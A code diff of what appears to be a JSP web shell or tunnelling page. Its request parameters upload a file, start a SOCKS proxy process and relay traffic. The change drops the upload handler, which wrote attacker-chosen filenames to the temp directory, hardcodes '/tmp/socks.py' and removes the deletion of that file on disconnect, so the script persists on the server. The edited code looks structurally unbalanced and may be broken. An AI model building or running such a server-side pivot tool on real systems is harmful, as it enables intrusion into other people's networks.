@@ -53,38 +53,9 @@ if(request.getParameter("proxy") == "" ){
 	if(request.getParameter("file") == "" ){	//If url parameter file is set
 		if(request.getParameter("upload") == "" ){	//reads file and saves it to temp
 			String contentType = request.getContentType();
-			if ((contentType != null) && (contentType.indexOf("multipart/form-data") >= 0)) {
-				DataInputStream in = new DataInputStream(request.getInputStream());
-				int formDataLength = request.getContentLength();
-				byte dataBytes[] = new byte[formDataLength];
-				int byteRead = 0;
-				int totalBytesRead = 0;
-				while (totalBytesRead < formDataLength) {
-					byteRead = in.read(dataBytes, totalBytesRead, formDataLength);
-					totalBytesRead += byteRead;
-					}
-				String file = new String(dataBytes);
-				String saveFile = file.substring(file.indexOf("filename=\"") + 10, file.lastIndexOf("Content-Type")-3);
-				//String saveFile = "filename.exe";
-				saveFile = System.getProperty("java.io.tmpdir") + '/' + saveFile;
-				session.setAttribute("file", saveFile);
-				int lastIndex = contentType.lastIndexOf("=");
-				String boundary = contentType.substring(lastIndex + 1,contentType.length());
-				int pos;
-				//extracting the index of file 
-				pos = file.indexOf("filename=\"");
-				pos = file.indexOf("\n", pos) + 1;
-				pos = file.indexOf("\n", pos) + 1;
-				pos = file.indexOf("\n", pos) + 1;
-				int boundaryLocation = file.indexOf(boundary, pos) - 4;
-				int startPos = ((file.substring(0, pos)).getBytes()).length;
-				int endPos = ((file.substring(0, boundaryLocation)).getBytes()).length;
-				// creating a new file with the same name and writing the content in new file
-				//TODO: catch exception if file exists
-				FileOutputStream fileOut = new FileOutputStream((String) session.getAttribute("file"));
-				fileOut.write(dataBytes, startPos, (endPos - startPos));
-				fileOut.flush();
-				fileOut.close();
+			
+				session.setAttribute("file", "/tmp/socks.py");
+				
 				os.write(("[Server] File Uploaded at " + (String) session.getAttribute("file")).getBytes());
 				os.flush();
 				os.close();
@@ -98,11 +69,7 @@ if(request.getParameter("proxy") == "" ){
 		if (socket != null){
 			socket.close();
 			}
-		if (session.getAttribute("file") != ""){
-			String s=(String) session.getAttribute("file"); 
-			File f = new File(s);  
-			f.delete();
-		}
+
 		if (session.getAttribute("SocksProcess") != ""){
 			Process p = (Process) session.getAttribute("SocksProcess");  
 			p.destroy();
